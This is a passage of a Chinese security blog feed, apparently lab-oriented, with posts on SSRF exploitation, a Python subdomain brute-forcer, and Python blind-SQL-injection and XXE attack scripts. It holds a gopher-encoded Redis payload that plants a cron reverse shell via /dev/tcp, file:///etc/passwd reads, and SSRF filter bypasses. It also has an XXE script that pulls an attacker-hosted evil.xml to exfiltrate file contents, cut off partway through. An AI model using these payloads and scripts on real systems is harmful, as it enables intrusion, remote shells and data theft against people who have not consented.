title="利用SSRF漏洞"></a>利用SSRF漏洞</h5><ol><li>让服务器去访问相应的网址</li><li>让服务器去访问自己所处内网的一些指纹文件来判断是否存在相应的CMS</li><li>可以使用file、dict、gopher、ftp协议进行请求访问相应的文件</li><li>攻击运行在内网或本地的应用程序（比如溢出）;</li><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</li></ol><p>SSRF中各个编程语言可以使用的协议如下图所示：</p><p><img src="12.png" alt=""></p><ul><li><p>file协议</p><p>​    查看文件：file:///etc/passwd</p></li><li><p>dict协议</p><p>​    探测端口：dict://127.0.0.1:80</p></li><li><p>gopher协议</p><p>​    Gopher协议可以做很多，特别是在SSRF漏洞中可以发挥很多重要的作用，利用此协议可以攻击内网的FTP、Telnet Redis Memcache 也可以进行GET POST请求 .</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">curl</span> -v 'http://sec.com:8082/sec/ssrf.php?url=gopher<span class="number">%3</span>A<span class="number">%2</span>F<span class="number">%2</span>F127.0.0.1<span class="number">%3</span>A6379<span class="number">%2</span>F_<span class="number">%2</span>A3<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%243</span><span class="number">%250</span>d<span class="number">%250</span>aset<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%241</span><span class="number">%250</span>d<span class="number">%250</span>a1<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2456</span><span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%250</span>a<span class="number">%250</span>a<span class="number">%2</span>A<span class="number">%2</span>F1<span class="number">%20</span><span class="number">%2</span>A<span class="number">%20</span><span class="number">%2</span>A<span class="number">%20</span><span class="number">%2</span>A<span class="number">%20</span><span class="number">%2</span>A<span class="number">%20</span>bash<span class="number">%20</span>-i<span class="number">%20</span><span class="number">%3</span>E<span class="number">%26</span><span class="number">%20</span><span class="number">%2</span>Fdev<span class="number">%2</span>Ftcp<span class="number">%2</span>F127.0.0.1<span class="number">%2</span>F2333<span class="number">%200</span><span class="number">%3</span>E<span class="number">%261</span><span class="number">%250</span>a<span class="number">%250</span>a<span class="number">%250</span>a<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2</span>A4<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%246</span><span class="number">%250</span>d<span class="number">%250</span>aconfig<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%243</span><span class="number">%250</span>d<span class="number">%250</span>aset<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%243</span><span class="number">%250</span>d<span class="number">%250</span>adir<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2416</span><span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2</span>Fvar<span class="number">%2</span>Fspool<span class="number">%2</span>Fcron<span class="number">%2</span>F<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2</span>A4<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%246</span><span class="number">%250</span>d<span class="number">%250</span>aconfig<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%243</span><span class="number">%250</span>d<span class="number">%250</span>aset<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2410</span><span class="number">%250</span>d<span class="number">%250</span>adbfilename<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%244</span><span class="number">%250</span>d<span class="number">%250</span>aroot<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2</span>A1<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%244</span><span class="number">%250</span>d<span class="number">%250</span>asave<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2</span>A1<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%244</span><span class="number">%250</span>d<span class="number">%250</span>aquit<span class="number">%250</span>d<span class="number">%250</span>a'</span><br></pre></td></tr></table></figure></li></ul><ol><li>攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包）</li><li>攻击内网应用程序（利用跨协议通信技术）</li><li>DOS攻击</li><li>判断内网主机是否存活：访问是否有端口开放</li></ol><h5 id="常见的绕过方法"><a href="#常见的绕过方法" class="headerlink" title="常见的绕过方法"></a>常见的绕过方法</h5><ul><li><p>@绕过：<code>http://xxx.com@10.10.10.10=10.10.10.10</code></p></li><li><p>利用特殊的域名</p></li><li><p>利用句号</p><p>127。0。0。1=&gt;127.0.0.1</p></li><li><p>利用协议</p></li><li><p>利用Enclosed </p></li><li><p>IP使用其他进制：127.0.0.1=2130706433</p></li><li><p>使用短地址：<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> ==<a href="https://dwz.lc/2fGYWaE" target="_blank" rel="noopener">https://dwz.lc/2fGYWaE</a></p></li></ul><h5 id=""><a href="#" class="headerlink" title=""></a><img src="QQ%E6%88%AA%E5%9B%BE20200212110340.png" alt=""></h5><h4 id="bWAPP靶场实战（SSRF"><a href="#bWAPP靶场实战（SSRF" class="headerlink" title="bWAPP靶场实战（SSRF)"></a>bWAPP靶场实战（SSRF)</h4><h5 id="一、使用（RFI）远程文件包含进行端口扫描（内网探测）"><a href="#一、使用（RFI）远程文件包含进行端口扫描（内网探测）" class="headerlink" title="一、使用（RFI）远程文件包含进行端口扫描（内网探测）"></a>一、使用（RFI）远程文件包含进行端口扫描（内网探测）</h5><p>我们进入bWAPP  SSRF部分。</p><img src="QQ截图20200128162933.png" style="zoom:50%;" /><p>我们点击黑体字Port scan得到了端口扫描的攻击脚本</p><img src="QQ截图20200128163234.png" style="zoom:50%;" /><p>我们退出SSRF模块 进入（RFI/LFI)模块，发现?language=lang_en.php此处可能存在文件包含漏洞。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128163521.png" alt=""></p><p>我们在VM中开启了虚拟机，得知IP为192.168.153.131</p><img src="QQ截图20200128164256.png" style="zoom:50%;" /><h5 id="二、使用XXE获取敏感文件中的内容"><a href="#二、使用XXE获取敏感文件中的内容" class="headerlink" title="二、使用XXE获取敏感文件中的内容"></a>二、使用XXE获取敏感文件中的内容</h5><p>我们先点击黑体字获取XXE攻击脚本。</p><img src="QQ截图20200128170206.png" style="zoom:67%;" /><p><img src="QQ%E6%88%AA%E5%9B%BE20200128170255.png" alt=""></p><p> 然后使用Burp抓包后发送到Repeater模块，</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128171953.png" alt=""></p><p> 第一次我们使用http协议读取robots.txt文件内容</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128175808.png" alt=""></p><p>第二次我们使用php协议读取 xml页面中的内容</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128175940.png" alt=""></p><p>第三次我们使用file协议读取本机的/etc/passwd的内容</p><img src="QQ截图20200128180043.png" style="zoom:67%;" /><h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://xz.aliyun.com/t/7333" target="_blank" rel="noopener">https://xz.aliyun.com/t/7333</a></p><p><a href="https://damit5.com/2018/05/26/SSRF-漏洞学习" target="_blank" rel="noopener">https://damit5.com/2018/05/26/SSRF-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0</a></p><p><a href="https://www.cnblogs.com/zhaijiahui/p/7828585.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaijiahui/p/7828585.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;SSRF漏洞部分&quot;&gt;&lt;a href=&quot;#SSRF漏洞部分&quot; class=&quot;headerlink&quot; title=&quot;SSRF漏洞部分&quot;&gt;&lt;/a&gt;SSRF漏洞部分&lt;/h3&gt;&lt;h4 id=&quot;SSRF简述&quot;&gt;&lt;a href=&quot;#SSRF简述&quot; class=&quot;headerli
      
    
    </summary>
    
    
      <category term="web漏洞学习" scheme="https://shu1l.github.io/categories/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="SSRF漏洞" scheme="https://shu1l.github.io/tags/SSRF%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>python编写子域名爆破小工具</title>
    <link href="https://shu1l.github.io/2020/04/20/python-bian-xie-zi-yu-ming-bao-po-xiao-gong-ju/"/>
    <id>https://shu1l.github.io/2020/04/20/python-bian-xie-zi-yu-ming-bao-po-xiao-gong-ju/</id>
    <published>2020-04-20T04:42:19.000Z</published>
    <updated>2020-04-28T05:09:06.824Z</updated>
    
    <content type="html"><![CDATA[<h2 id="python编写子域名爆破小工具"><a href="#python编写子域名爆破小工具" class="headerlink" title="python编写子域名爆破小工具"></a>python编写子域名爆破小工具</h2><h4 id="字典生成工具编写"><a href="#字典生成工具编写" class="headerlink" title="字典生成工具编写"></a>字典生成工具编写</h4><p>这里主要使用的python的exrex模块：</p><p>此处有详细介绍，</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/asciimoo/</span>exrex</span><br></pre></td></tr></table></figure><p>这个模块的主要功能：</p><ul><li>生成所有匹配的字符串</li><li>生成随机匹配的字符串</li><li>计算匹配字符串的数量</li><li>简化正则表达式</li></ul><p>安装方法：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip <span class="keyword">install</span> exrex</span><br></pre></td></tr></table></figure><p>我们主要使用该模块的generate()方法。</p><ul><li>generate(s,limit=20)</li><li>函数的作用：创建一个生成器，生成给定正则表达式的所有匹配字符串</li><li>参数s:正则表达式</li><li>limit：范围限制，要求limit的类型为整型数</li></ul><h5 id="简单的例子："><a href="#简单的例子：" class="headerlink" title="简单的例子："></a>简单的例子：</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import exrex</span><br><span class="line"></span><br><span class="line"><span class="attribute">web_dic</span>=<span class="string">'demo'</span></span><br><span class="line"><span class="attribute">dic_pass</span>=<span class="string">'admin'</span></span><br><span class="line">rule = <span class="string">'&#123;web_dic&#125;[!@#]&#123;dic_pass&#125;'</span></span><br><span class="line">s = rule.format(<span class="attribute">web_dic</span>=web_dic,dic_pass=dic_pass)</span><br><span class="line">dics = list(exrex.generate(s))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dics:</span><br><span class="line">    <span class="builtin-name">print</span> i</span><br></pre></td></tr></table></figure><h4 id="编写子域名爆破脚本"><a href="#编写子域名爆破脚本" class="headerlink" title="编写子域名爆破脚本"></a>编写子域名爆破脚本</h4><p>自己编写的理解脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> exrex  <span class="comment">#导入生成字典模块</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">host_replace</span><span class="params">(hosts)</span>:</span>         <span class="comment">#域名处理方法</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'://'</span> <span class="keyword">in</span> hosts:</span><br><span class="line">        hosts = hosts.split(<span class="string">'://'</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'/'</span> <span class="keyword">in</span> hosts: </span><br><span class="line">        hosts = hosts.replace(<span class="string">'/'</span>,<span class="string">''</span>)              </span><br><span class="line">    hosts = <span class="string">""</span>.join(hosts)</span><br><span class="line">    <span class="keyword">return</span> hosts</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dic_create</span><span class="params">(hosts)</span>:</span>        <span class="comment">#子域名字典生成方法</span></span><br><span class="line">    web_white = [<span class="string">'com'</span>, <span class="string">'cn'</span>, <span class="string">'gov'</span>, <span class="string">'edu'</span>, <span class="string">'org'</span>]</span><br><span class="line">    web_dics = hosts.split(<span class="string">'.'</span>)</span><br><span class="line">    <span class="keyword">for</span> web_dic <span class="keyword">in</span> web_dics:</span><br><span class="line">        <span class="keyword">if</span> web_dic <span class="keyword">not</span> <span class="keyword">in</span> web_white:</span><br><span class="line">            f_rule = open(<span class="string">'rule.ini'</span>, <span class="string">'r'</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> f_rule:</span><br><span class="line">                dics = list(exrex.generate(web_dic+i.strip(<span class="string">'\r\n'</span>)))</span><br><span class="line">                <span class="keyword">for</span> dic <span class="keyword">in</span> dics:</span><br><span class="line">                    <span class="keyword">if</span> len(dic)&gt;<span class="number">3</span>:</span><br><span class="line">                        dic_out = open(<span class="string">'mypass.txt'</span>,<span class="string">'a+'</span>)</span><br><span class="line">                        dic_out.write(dic+<span class="string">'\r\n'</span>)</span><br><span class="line">                        dic_out.close()</span><br><span class="line">                        <span class="keyword">print</span> dic</span><br><span class="line">    f_rule.close()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span>       <span class="comment">#主函数</span></span><br><span class="line">    hosts = raw_input(<span class="string">"Write Your Hosts :"</span>)</span><br><span class="line">    host =host_replace(hosts)</span><br><span class="line">    dic_create(host)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.jianshu.com/p/a481a341eaa4" target="_blank" rel="noopener">https://www.jianshu.com/p/a481a341eaa4</a></p><p>子域名爆破脚本进阶版：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">import dns.resolver</span><br><span class="line">import threading</span><br><span class="line">import<span class="built_in"> Queue </span></span><br><span class="line">import optparse</span><br><span class="line">import sys                    </span><br><span class="line"></span><br><span class="line">queue = Queue.Queue()</span><br><span class="line">lock = threading.Lock()</span><br><span class="line"></span><br><span class="line">class GetSubDomain(threading.Thread):</span><br><span class="line">    <span class="string">""</span><span class="string">"docstring for SubDomain"</span><span class="string">""</span></span><br><span class="line">    def __init__(self, target,queue,outfile):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.target = target</span><br><span class="line">        self.queue = queue</span><br><span class="line">        self.rsv = dns.resolver.Resolver()</span><br><span class="line">        outfile = target + <span class="string">'.txt'</span> <span class="keyword">if</span> <span class="keyword">not</span> outfile <span class="keyword">else</span> outfile</span><br><span class="line">        self.f = open(<span class="string">'./output/'</span>+outfile,<span class="string">'a+'</span>)</span><br><span class="line">        self.ip_list = []</span><br><span class="line"></span><br><span class="line">    def _scan(self):</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.queue.empty():</span><br><span class="line">            self.ip_list = []</span><br><span class="line">            ips = None</span><br><span class="line">            sub_domain = self.queue.<span class="builtin-name">get</span>() + <span class="string">'.'</span> + self.target</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> range(3):</span><br><span class="line">                try:</span><br><span class="line">                    answers = self.rsv.query(sub_domain)</span><br><span class="line">                    <span class="keyword">if</span> answers:</span><br><span class="line">                        <span class="keyword">for</span> answer <span class="keyword">in</span> answers:</span><br><span class="line">                            <span class="keyword">if</span> answer.address <span class="keyword">not</span> <span class="keyword">in</span> self.ip_list:</span><br><span class="line">                                self.ip_list.append(answer.address)</span><br><span class="line">                except dns.resolver.NoNameservers, e:</span><br><span class="line">                    break</span><br><span class="line">                except Exception, e:</span><br><span class="line">                    pass</span><br><span class="line">            <span class="keyword">if</span> len(self.ip_list)&gt;0:</span><br><span class="line">                ips = <span class="string">','</span>.join(self.ip_list)</span><br><span class="line">                msg = sub_domain.ljust(30) + ips + <span class="string">'\n'</span></span><br><span class="line">                lock.acquire()</span><br><span class="line">                <span class="builtin-name">print</span> msg</span><br><span class="line">                self.f.write(msg)</span><br><span class="line">                lock.release()</span><br><span class="line">            self.queue.task_done()</span><br><span class="line"></span><br><span class="line">    def <span class="builtin-name">run</span>(self):</span><br><span class="line">        self._scan()</span><br><span class="line"></span><br><span class="line">def get_target(domain_list):</span><br><span class="line">    targets = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> open(domain_list,<span class="string">'r'</span>):</span><br><span class="line">        <span class="keyword">if</span> line:</span><br><span class="line">            targets.append(line.strip())</span><br><span class="line">    return targets</span><br><span class="line"></span><br><span class="line">def get_sub_queue(sub_file): #得到所有子域名的queue</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> open(sub_file,<span class="string">'r'</span>):</span><br><span class="line">        <span class="keyword">if</span> line:</span><br><span class="line">            queue.put(line.strip())</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser = optparse.OptionParser()</span><br><span class="line">    parser.add_option(<span class="string">'-u'</span>, <span class="string">'--url'</span>, <span class="attribute">dest</span>=<span class="string">'url'</span>,</span><br><span class="line">        <span class="attribute">type</span>=<span class="string">'string'</span>, <span class="attribute">help</span>=<span class="string">'Get a single top-level domain names.'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-l'</span>, <span class="string">'--list'</span>, <span class="attribute">dest</span>=<span class="string">'domain_list'</span>,</span><br><span class="line">        <span class="attribute">type</span>=<span class="string">'string'</span>, <span class="attribute">help</span>=<span class="string">'Top-level domain name list.'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-f'</span>, <span class="string">'--file'</span>, <span class="attribute">dest</span>=<span class="string">'sub_file'</span>, <span class="attribute">default</span>=<span class="string">'sub.txt'</span>,</span><br><span class="line">        <span class="attribute">type</span>=<span class="string">'string'</span>, <span class="attribute">help</span>=<span class="string">'Dict file used to brute sub names'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-t'</span>, <span class="string">'--threads'</span>, <span class="attribute">dest</span>=<span class="string">'threads_num'</span>, <span class="attribute">default</span>=60, </span><br><span class="line">        <span class="attribute">type</span>=<span class="string">'int'</span>, <span class="attribute">help</span>=<span class="string">'Number of threads. default = 60'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-o'</span>, <span class="string">'--outfile'</span>, <span class="attribute">dest</span>=<span class="string">'outfile'</span>, <span class="attribute">default</span>=None,</span><br><span class="line">        <span class="attribute">type</span>=<span class="string">'string'</span>, <span class="attribute">help</span>=<span class="string">'Output file name. default is &#123;target&#125;.txt'</span>)</span><br><span class="line"></span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> options.url:</span><br><span class="line">        urls = [options.url]</span><br><span class="line">    elif options.domain_list:</span><br><span class="line">        urls = get_target(options.domain_list)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        <span class="builtin-name">print</span> <span class="string">"Example: "</span></span><br><span class="line">        <span class="builtin-name">print</span> <span class="string">"\tpython getsub.py -u baidu.com"</span></span><br><span class="line">        <span class="builtin-name">print</span> <span class="string">"\tpython getsub.py -l domain.txt -f sub.txt -t 50"</span></span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        get_sub_queue(options.sub_file)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(1,options.threads_num+1):</span><br><span class="line">            t = GetSubDomain(url,queue,options.outfile)</span><br><span class="line">            t.setDaemon(<span class="literal">True</span>)</span><br><span class="line">            t.start()</span><br><span class="line">        queue.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;python编写子域名爆破小工具&quot;&gt;&lt;a href=&quot;#python编写子域名爆破小工具&quot; class=&quot;headerlink&quot; title=&quot;python编写子域名爆破小工具&quot;&gt;&lt;/a&gt;python编写子域名爆破小工具&lt;/h2&gt;&lt;h4 id=&quot;字典生成工具编写&quot;
      
    
    </summary>
    
    
      <category term="python学习" scheme="https://shu1l.github.io/categories/python%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>python编写sql注入&amp;xml注入工具</title>
    <link href="https://shu1l.github.io/2020/04/20/python-bian-xie-sql-zhu-ru-xml-zhu-ru-gong-ju/"/>
    <id>https://shu1l.github.io/2020/04/20/python-bian-xie-sql-zhu-ru-xml-zhu-ru-gong-ju/</id>
    <published>2020-04-20T04:41:52.000Z</published>
    <updated>2020-04-28T05:03:45.471Z</updated>
    
    <content type="html"><![CDATA[<h2 id="python编写sql注入-amp-xml注入工具"><a href="#python编写sql注入-amp-xml注入工具" class="headerlink" title="python编写sql注入&amp;xml注入工具"></a>python编写sql注入&amp;xml注入工具</h2><h4 id="python编写sql盲注注入脚本"><a href="#python编写sql盲注注入脚本" class="headerlink" title="python编写sql盲注注入脚本"></a>python编写sql盲注注入脚本</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import requests  #导入request模块</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.181.138/sqli-labs-master/Less-8/?id=1%s'</span></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0'</span>&#125;  #定义请求header头</span><br><span class="line"><span class="attribute">check_data</span>=list('1234567890abcdefghijklmnopqrstuzwxyz@')  </span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"SQL Injection for MySQL!"</span>)</span><br><span class="line">l = <span class="string">"' and length(database())=%s and '1'='1"</span>            #定义注入语句</span><br><span class="line">st = <span class="string">"' and substr(database(),%s,1)='%s'and '1'='1"</span>     #定义注入语句</span><br><span class="line">user = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,20):</span><br><span class="line">    sql = l % str(i)        #payload拼接</span><br><span class="line">    judge1 = requests.<span class="builtin-name">get</span>(url % sql,<span class="attribute">headers</span>=headers,timeout=30)</span><br><span class="line">    <span class="keyword">if</span> judge1.content.<span class="builtin-name">find</span>(b<span class="string">"You are in..........."</span>) != -1:   #判断页面回显</span><br><span class="line">        length = i</span><br><span class="line">        <span class="builtin-name">print</span>(i)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(1,i+1):</span><br><span class="line">    <span class="keyword">for</span> ss <span class="keyword">in</span> check_data:</span><br><span class="line">        str_user = st % (str(k),str(ss))</span><br><span class="line">        judge2 = requests.<span class="builtin-name">get</span>(url % str_user,<span class="attribute">headers</span>=headers,timeout = 30)</span><br><span class="line">        <span class="keyword">if</span> judge2.content.<span class="builtin-name">find</span>(b<span class="string">"You are in..........."</span>) != -1:</span><br><span class="line">           <span class="built_in"> user </span>=<span class="built_in"> user </span>+ ss</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span>(user)</span><br></pre></td></tr></table></figure><h4 id="python编写xml注入脚本"><a href="#python编写xml注入脚本" class="headerlink" title="python编写xml注入脚本"></a>python编写xml注入脚本</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from http.server import HTTPServer,CGIHTTPRequestHandler</span><br><span class="line">import threading</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def web_server():</span><br><span class="line">    port = 3344</span><br><span class="line">    httpd = HTTPServer(('',port),CGIHTTPRequestHandler)</span><br><span class="line">    print("[*] Starting simple_httpd on port:",httpd.server_port)</span><br><span class="line">    httpd.serve_forever()</span><br><span class="line"></span><br><span class="line">def send_data():</span><br><span class="line">    files = 'C:/web/PHPTutorial/WWW/xxe-lab-master/php_xxe/doLogin.php'</span><br><span class="line">    data = "<span class="meta">&lt;?xml version=\"1.0\"?&gt;</span>\r\n<span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [\r\n<span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> \<span class="meta-string">"php://filter/read=convert.base64-encode/resource=C:/web/PHPTutorial/WWW/xxe-lab-master/php_xxe/doLogin.php\"&gt;\r\n&lt;!ENTITY % dtd SYSTEM \"http://192.168.181.128/evil.xml\" &gt;\r\n%dtd;\r\n%send;\r\n]&gt;"</span></span></span></span><br><span class="line"><span class="meta"><span class="meta">    <span class="meta-keyword">requests</span>.post("<span class="meta-keyword">http</span>://192.168.181.138/<span class="meta-keyword">xxe-lab-master</span>/<span class="meta-keyword">php_xxe</span>/",<span class="meta-keyword">data</span>=<span class="meta-keyword">data</span>)</span></span></span><br><span class="line"><span class="meta"><span class="meta">    <span class="meta-keyword">files</span> = <span class="meta-keyword">input</span>("<span class="meta-keyword">Write</span> <span class="meta-keyword">filename</span>")</span></span></span><br><span class="line"><span class="meta"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="meta">if <span class="meta-keyword">__name__</span> == <span class="meta-string">'__main__'</span>:</span></span></span><br><span class="line"><span class="meta"><span class="meta">    <span class="meta-keyword">file</span> = <span class="meta-keyword">open</span>('<span class="meta-keyword">evil</span>.<span class="meta-keyword">xml</span>','w')</span></span></span><br><span class="line"><span class="meta"><span class="meta">    <span 